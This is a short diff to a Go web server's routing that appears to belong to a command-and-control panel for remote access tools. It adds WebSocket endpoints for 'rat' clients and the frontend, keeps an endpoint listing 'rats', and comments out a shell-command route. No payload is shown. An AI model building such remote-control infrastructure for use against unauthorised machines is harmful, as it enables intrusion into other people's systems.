@@ -10,20 +10,15 @@ import (
 func main() {
 	staticPath := filepath.Join("backend", "static")
 	http.Handle("/_app/", http.StripPrefix("/_app/", http.FileServer(http.Dir(filepath.Join(staticPath, "_app")))))
-
-	// Serve frontend routes
 	http.HandleFunc("/", handlers.ServeFrontend)
 
-	// WebSocket endpoint for rats
-	http.HandleFunc("/ws", handlers.WebSocketHandler)
+	http.HandleFunc("/ws/rat", handlers.RatWebSocketHandler)
+	http.HandleFunc("/ws/frontend", handlers.FrontendWebSocketHandler)
 
-	// API endpoint to get all rats
 	http.HandleFunc("/api/rats", handlers.GetRats)
+	//http.HandleFunc("/api/shell/", handlers.ShellCommandHandler)
 
-	// API endpoint to send shell commands
-	http.HandleFunc("/api/shell/", handlers.ShellCommandHandler)
-
-	log.Println("Server starting on localhost:8080")
+	log.Println("Server starting on http://localhost:8080")
 	if err := http.ListenAndServe(":8080", nil); err != nil {
 		log.Fatal(err)
 	}
